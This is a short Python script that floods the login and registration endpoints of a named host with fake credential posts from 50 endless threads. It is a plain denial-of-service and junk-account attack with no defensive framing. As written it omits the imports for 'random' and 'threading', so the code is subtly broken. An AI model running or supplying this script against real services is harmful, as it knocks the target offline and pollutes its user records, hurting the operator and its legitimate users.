import requests

# Flood the authentication endpoints
auth_endpoints = [
    "http://ipc.gps555.net/api/v1/sys-user/login",
    "http://ipc.gps555.net/api/v1/sys-user/register"
]

def flood_auth():
    while True:
        for endpoint in auth_endpoints:
            fake_data = {
                "email": f"user{random.randint(0,10000)}@example.com",
                "password": "password123"
            }
            try:
                requests.post(endpoint, json=fake_data, timeout=1)
            except:
                pass

# Launch multiple threads
for _ in range(50):
    threading.Thread(target=flood_auth).start()
